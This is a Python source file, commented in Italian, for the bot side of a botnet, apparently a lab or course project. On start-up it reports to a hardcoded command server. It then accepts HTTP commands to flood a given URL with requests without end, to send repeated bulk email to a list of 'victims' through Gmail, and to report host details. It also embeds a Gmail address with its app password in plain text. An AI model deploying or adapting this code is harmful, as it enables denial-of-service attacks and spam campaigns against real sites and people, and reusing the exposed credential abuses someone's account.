import concurrent
import json
import platform
import smtplib
import socket
import threading
from asyncio import Event
from concurrent.futures import ThreadPoolExecutor
from email.mime.text import MIMEText
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen

server_address = ('10.0.2.15', 15200)
# server_address = ('127.0.0.1', 15200)


def initialize_bot():
    """
    Avvia il thread principale del bot
    """
    print("Initializing bot...")
    with ThreadPoolExecutor(max_workers=1) as ex:
        x = ex.submit(run)

        concurrent.futures.wait([x], return_when=concurrent.futures.ALL_COMPLETED)

        ex.shutdown(wait=True)


def run():
    """
    Avvia il bot e lo connette al server inviando l'ip e la porta su cui è in ascolto
    """
    server = HTTPServer(('', 0), Bot)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server_address[0], server_address[1]))
    s.send(json.dumps({
        'ip': s.getsockname()[0],
        'port': server.server_port
    }).encode('utf-8'))
    s.close()
    server.serve_forever()


def get_client_info():
    """
    Raccoglie informazioni relative alla macchina su cui è in esecuzione il bot
    :return:
    """
    return {
        "cpu": platform.processor(),
        'architecture': platform.architecture(),
        'machine': platform.machine(),
        'platform': platform.platform(),
        "system": platform.system(),
    }


class Bot(BaseHTTPRequestHandler):
    """
    Classe che gestisce le richieste http in arrivo dal centro di comando
    Implementa i metodi do_GET e do_POST
    """

    event = Event()

    current_action = []

    lock = threading.Lock()

    def set_header(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()

    def start_thread(self, t):
        t.daemon = True
        t.start()

        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({'success': "Attacco avviato con successo"}).encode('utf-8'))

    def log_message(self, f, *args):
        return

    def do_GET(self):
        if self.path == "/status":
            self.set_header()
            with self.lock:
                self.wfile.write(json.dumps(self.current_action).encode('utf-8'))
        if self.path == "/client-info":
            self.set_header()
            self.wfile.write(json.dumps(get_client_info()).encode('utf-8'))
        if self.path == "/stop-attack":
            self.event.set()
            self.set_header()
            self.wfile.write(json.dumps({'success': "Attacco fermato con successo"}).encode('utf-8'))

    def do_POST(self):
        if self.path == "/attack":
            content_length = int(self.headers['Content-Length'])
            body = json.loads(self.rfile.read(content_length).decode('utf-8'))

            t = threading.Thread(target=self.request_spam, args=(body['url'], self.event))
            self.start_thread(t)
        if self.path == "/mail-spam":
            content_length = int(self.headers['Content-Length'])
            body = json.loads(self.rfile.read(content_length).decode('utf-8'))

            t = threading.Thread(target=self.mail_spam,
                                 args=(body['emails'], body['message'], body["mail_object"], body["number_of_emails"]))
            self.start_thread(t)

    def mail_spam(self, victims, message, obj, number_of_emails):
        """
        Invia un numero di email alla lista di vittime specificata
        :param victims: lista di mail delle vittime
        :param message: messaggio da inviare
        :param obj: oggetto della mail
        :param number_of_emails: numero di mail da inviare
        """
        sender = "botnetsicurezza@gmail.com"
        password = "cebqshlncuewhjso"

        self.current_action.append({
            "operation": "Mail spam in corso",
            "targets": victims,
        })

        smtp_server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        smtp_server.login(sender, password)
        msg = MIMEText(message)
        msg['Subject'] = obj
        msg['From'] = sender
        msg['Bcc'] = ', '.join(victims)

        for _ in range(number_of_emails):
            smtp_server.send_message(msg)

        if self.current_action[0]["operation"] == 'Mail spam in corso':
            self.current_action.pop(0)
        else:
            self.current_action.pop(1)

        smtp_server.quit()

    def request_spam(self, url, e):
        """
        Invia richieste http al server specificato. Se il server non è raggiungibile, il thread si ferma
        :param url: url a cui inviare le richieste
        :param e: evento che ferma il thread
        """
        if not self.current_action:
            self.current_action.append({
                "operation": "Attacco in corso",
                "targets": [url]
            })
        elif self.current_action[0]["operation"] == 'Attacco in corso':
            self.current_action[0]["targets"].append(url)
        elif self.current_action[1]["operation"] == 'Attacco in corso':
            self.current_action[1]["targets"].append(url)

        e.clear()
        while not e.is_set():
            req = Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            try:
                urlopen(req).read()
            except HTTPError as error:
                e.set()
                print(f'HTTPError: {error}')
            except URLError as error:
                e.set()
                print(f'URLError: {error}')
            else:
                print(f'Attacco in corso a {url}')

        if self.current_action:
            if self.current_action[0]["operation"] == 'Attacco in corso':
                self.current_action.pop(0)
            else:
                self.current_action.pop(1)


if __name__ == '__main__':
    initialize_bot()
